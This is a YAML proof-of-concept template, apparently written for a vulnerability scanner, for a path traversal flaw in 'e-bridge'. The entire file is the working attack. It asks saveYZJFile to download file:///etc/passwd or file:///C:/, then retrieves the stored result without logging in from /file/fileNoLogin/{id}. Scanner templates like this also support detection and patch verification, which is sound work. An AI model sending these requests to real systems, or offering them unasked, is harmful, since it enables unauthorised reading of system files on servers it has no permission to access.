name: poc-yaml-e-bridge-path-traversal
groups:
  win:
    - method: GET
      path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt
      expression: "true"
      search: |
        ,"id":"(?P<id>.+?)",
    - method: GET
      path: /file/fileNoLogin/{{id}}
      expression: |
        response.status == 200 && response.body.bcontains(b"Windows") && response.body.bcontains(b"Users") 
  linux:
    - method: GET
      path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
      expression: "true"
      search: |
        ,"id":"(?P<id>.+?)",
    - method: GET
      path: /file/fileNoLogin/{{id}}
      expression: |
        response.status == 200 && response.body.bcontains(b"root:x:")
detail:
  author: sakura404x
  links:
    - https://www.cnblogs.com/KHZ521/p/14017940.html
